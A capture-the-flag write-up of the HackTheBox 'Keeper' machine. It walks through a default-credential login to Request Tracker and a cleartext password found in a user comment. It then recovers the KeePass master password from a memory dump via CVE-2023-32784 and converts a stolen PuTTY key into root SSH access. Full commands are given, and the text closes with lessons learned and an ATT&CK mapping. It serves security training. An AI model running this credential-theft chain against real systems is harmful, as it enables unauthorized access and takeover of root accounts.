# Keeper: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Keeper |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.37.151 |
| **Tools Used** | Nmap, Firefox, Request Tracker (web), SSH, scp, git, dotnet, kpcli, puttygen |
| **Techniques** | Default Credential Abuse (Request Tracker), Web Application User Enumeration, Cleartext Password in User Profile, SSH Access, KeePass Memory Dump Analysis (CVE-2023-32784), KeePass Database Extraction, PuTTY Private Key Conversion, SSH Key-Based Root Login |
| **CVEs** | CVE-2023-32784 (KeePass master password recovery from memory dump) |
| **Date** | July 2026 |

---

## Attack Chain Summary

```
Nmap → Port 80 nginx → redirect to tickets.keeper.htb →
/etc/hosts update → Request Tracker login page →
Default credentials root:<redacted> → Admin dashboard →
Admin > Users → lnorgaard → plaintext password in comment field →
SSH as lnorgaard → User flag →
ls ~/: RT30000.zip found → unzip → KeePassDumpFull.dmp + passcodes.kdbx →
scp RT30000.zip to attacker → CVE-2023-32784 keepass-password-dumper →
dgrød med fløde → Google corrects to rødgrød med fløde →
kpcli open passcodes.kdbx → passcodes/Network/ → keeper.htb (Ticketing Server) →
PuTTY RSA private key in Notes field → puttygen converts to OpenSSH id_rsa →
chmod 600 id_rsa → ssh root@10.129.37.151 -i id_rsa → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services on the target.

```
kali@kali:~$ ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.129.37.151 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
kali@kali:~$ nmap -p$ports -Pn -sC -sV 10.129.37.151

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**Output Analysis**

| Port | Service | Notes |
| --- | --- | --- |
| 22 | OpenSSH 8.9p1 Ubuntu | SSH: entry point once credentials obtained |
| 80 | nginx 1.18.0 | Web server: enumerate immediately |

Two open ports. No web application version is visible from nmap alone: browsing to port 80 is the next step. SSH without credentials is a dead end at this stage.

---

## Step 2: Web Enumeration and Host Configuration

**Goal:** Identify the web application running on port 80 and configure hostname resolution.

Browsing to `http://10.129.37.151` revealed a link to the virtual host:

```
To raise an IT support ticket, please visit tickets.keeper.htb/rt/
```

Added both hostnames:

```
kali@kali:~$ echo "10.129.37.151 tickets.keeper.htb keeper.htb" | sudo tee -a /etc/hosts
```

Browsing to `http://tickets.keeper.htb/rt/` revealed a **Request Tracker (RT)** login page. The footer showed `RT 4.4.4+dfsg-2ubuntu1`.

---

## Step 3: Default Credential Login to Request Tracker

**Goal:** Gain administrative access to Request Tracker using default credentials.

Request Tracker ships with a documented default administrator account:

| Field | Value |
| --- | --- |
| Username | `root` |
| Password | `<default-password-redacted>` |

Login succeeded and full administrator dashboard access was obtained.

**Why this works:** Default credentials are left unchanged when system administrators deploy applications without following hardening checklists. Any external-facing RT instance should have its default admin password changed immediately on deployment.

---

## Step 4: User Enumeration and Cleartext Password Discovery

**Goal:** Enumerate users in the RT admin panel to find additional credentials.

Navigated to **Admin → Users**: two users listed:

| ID | Username | Full Name | Email | Status |
| --- | --- | --- | --- | --- |
| 27 | lnorgaard | Lise Norgaard | lnorgaard@keeper.htb | Enabled |
| 14 | root | Enoch Root | root@localhost | Disabled |

The `lnorgaard` profile contained an initial password in the **Comments about this user** field.

**Credentials found in plaintext:**

| Username | Password |
| --- | --- |
| `lnorgaard` | `<redacted>` |

This is a critical misconfiguration. The comment field in user management interfaces is intended for administrator notes, not credential storage.

---

## Step 5: SSH as lnorgaard: User Flag

**Goal:** Log in via SSH using the discovered credentials and capture the user flag.

```
kali@kali:~$ ssh lnorgaard@10.129.37.151
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

Captured user flag:

```
lnorgaard@keeper:~$ cat user.txt
<user-flag-redacted>
```

---

## Step 6: Filesystem Enumeration

**Goal:** Identify files in the home directory that may lead to privilege escalation.

```
lnorgaard@keeper:~$ ls -la
-rw-r--r-- 1 lnorgaard lnorgaard 87391651 Jul 25 19:50 RT30000.zip
-rw-r--r-- 1 lnorgaard lnorgaard       33 Jul 25 19:46 user.txt
```

`RT30000.zip` is unusually large. Unzipping it produced:

```
lnorgaard@keeper:~$ unzip RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx
```

| File | Type | Significance |
| --- | --- | --- |
| `KeePassDumpFull.dmp` | Windows memory dump | Full process memory dump of KeePass: may contain master password |
| `passcodes.kdbx` | KeePass database | Encrypted password database: requires master password to open |

---

## Step 7: Transfer Files to Attacker Machine

**Goal:** Copy the zip file to the attacker machine for local exploitation.

```
kali@kali:~$ scp lnorgaard@10.129.37.151:/home/lnorgaard/RT30000.zip .
kali@kali:~$ unzip RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx
```

---

## Step 8: KeePass Master Password Recovery (CVE-2023-32784)

**Goal:** Recover the KeePass master password from the process memory dump.

CVE-2023-32784 is a memory disclosure vulnerability in KeePass 2.x before 2.54. When a user types their master password into KeePass, typed character patterns can remain in process memory. A memory dump can therefore leak most of the master password.

Installed the required runtime and cloned the PoC:

```
kali@kali:~$ sudo apt install dotnet-sdk-7.0 -y
kali@kali:~$ git clone https://github.com/vdohney/keepass-password-dumper.git
kali@kali:~$ cd keepass-password-dumper
```

Ran the dumper:

```
kali@kali:~/keepass-password-dumper$ dotnet run ../KeePassDumpFull.dmp
Combined: ●{...}dgrød med fløde
```

The first character is unknown, but the recovered phrase is Danish. Searching the partial phrase points to:

```
rødgrød med fløde
```

This opened the KeePass database.

---

## Step 9: Open KeePass Database with kpcli

**Goal:** Use the recovered master password to open `passcodes.kdbx` and enumerate its contents.

```
kali@kali:~$ sudo apt-get install kpcli -y
kali@kali:~$ kpcli
kpcli:/> open passcodes.kdbx
kpcli:/> cd passcodes/Network/
kpcli:/passcodes/Network> show 0 -f
```

The `keeper.htb (Ticketing Server)` entry contained:

| Field | Value | Significance |
| --- | --- | --- |
| Username | `root` | Target account for SSH |
| Password | `<root-password-redacted>` | Root password material found in KeePass |
| Notes | `<redacted PuTTY private key block>` | SSH private key in PuTTY format: needs conversion to OpenSSH |

The Notes field contained a complete **PuTTY User Key File version 3** (`.ppk`) private RSA key for the `root` account.

---

## Step 10: Convert PuTTY Key to OpenSSH Format

**Goal:** Convert the PuTTY private key to OpenSSH format for use with the `ssh` command.

Saved the full PuTTY key block from the Notes field to a file:

```
kali@kali:~$ cat > ssh_key_file << 'EOF'
<redacted PuTTY private key block from KeePass Notes field>
EOF
```

Converted it with `puttygen`:

```
kali@kali:~$ puttygen ssh_key_file -O private-openssh -o id_rsa
kali@kali:~$ chmod 600 id_rsa
```

**Flag explanation:**

- `-O private-openssh`: output type: OpenSSH private key format
- `-o id_rsa`: output filename
- `chmod 600`: required because SSH rejects overly-readable private keys

---

## Step 11: SSH as root: Root Flag

**Goal:** Use the converted private key to log in as root and capture the root flag.

```
kali@kali:~$ ssh root@10.129.37.151 -i id_rsa
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)

root@keeper:~# cat root.txt
<root-flag-redacted>
```

---

## Lessons Learned

**1. Default credentials on admin interfaces are game-over.**
Request Tracker's default administrator credentials allowed immediate access to the admin dashboard.

**2. User comment fields are not a credential store.**
The initial password for `lnorgaard` was left in an administrative comment field.

**3. KeePass memory dumps leak the master password (CVE-2023-32784).**
A full process memory dump of KeePass can contain recoverable master password evidence in typed character patterns.

**4. KeePass database Notes fields are full-text and store arbitrary data.**
The root SSH key was stored inside the Notes field of a KeePass entry.

**5. PuTTY key format requires conversion before OpenSSH use.**
PuTTY `.ppk` keys must be converted with `puttygen` before standard Linux `ssh` can use them.

**6. The `chmod 600` step is mandatory for SSH key authentication.**
OpenSSH refuses to use private keys that are group- or world-readable.

---

## Full Attack Chain Reference

1. Ran full TCP scan and targeted service scan: identified SSH and nginx
2. Browsed web server: redirected to `tickets.keeper.htb/rt/`
3. Added `tickets.keeper.htb` and `keeper.htb` to `/etc/hosts`
4. Logged into Request Tracker using default admin credentials
5. Enumerated users and found `lnorgaard`
6. Read plaintext initial password from RT user comment field
7. SSH'd as `lnorgaard` and captured user flag
8. Found `RT30000.zip` in home directory
9. Extracted `KeePassDumpFull.dmp` and `passcodes.kdbx`
10. Transferred archive to attacker host
11. Ran `keepass-password-dumper` against the KeePass memory dump
12. Reconstructed the master password phrase
13. Opened `passcodes.kdbx` with `kpcli`
14. Found root entry containing a PuTTY private key in Notes
15. Converted PuTTY key to OpenSSH format with `puttygen`
16. Set private key permissions to `600`
17. SSH'd as root with the converted key
18. Captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -Pn -p- --min-rate=1000 -T4 10.129.37.151` | Fast full port discovery |
| `nmap -p$ports -Pn -sC -sV 10.129.37.151` | Targeted version and script scan |
| `echo "10.129.37.151 tickets.keeper.htb keeper.htb" | sudo tee -a /etc/hosts` | Add virtual hostnames |
| `ssh lnorgaard@10.129.37.151` | Initial SSH login with discovered credentials |
| `scp lnorgaard@10.129.37.151:/home/lnorgaard/RT30000.zip .` | Transfer zip file to attacker |
| `unzip RT30000.zip` | Extract KeePass dump and database |
| `sudo apt install dotnet-sdk-7.0 -y` | Install .NET runtime for PoC tool |
| `git clone https://github.com/vdohney/keepass-password-dumper.git` | Clone CVE-2023-32784 PoC |
| `dotnet run ../KeePassDumpFull.dmp` | Recover KeePass master password from memory dump |
| `sudo apt-get install kpcli -y` | Install KeePass CLI tool |
| `kpcli` | Launch KeePass CLI |
| `open passcodes.kdbx` | Open database inside kpcli |
| `cd passcodes/Network` | Navigate to Network group |
| `show 0 -f` | Show full entry including Notes field |
| `puttygen ssh_key_file -O private-openssh -o id_rsa` | Convert PuTTY key to OpenSSH format |
| `chmod 600 id_rsa` | Set correct private key permissions |
| `ssh root@10.129.37.151 -i id_rsa` | SSH as root using private key |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Valid Accounts: Default Accounts | T1078.001 | Default Request Tracker administrator credentials grant admin access |
| Credentials in Files | T1552.001 | Plaintext password stored in RT user comment field |
| Credentials from Password Stores | T1555.001 | KeePass database accessed via recovered master password |
| Unsecured Credentials: Private Keys | T1552.004 | PuTTY SSH private key extracted from KeePass Notes field |
| OS Credential Dumping | T1003 | CVE-2023-32784: KeePass master password recovered from process memory dump |
| Remote Services: SSH | T1021.004 | Root SSH login using converted private key |
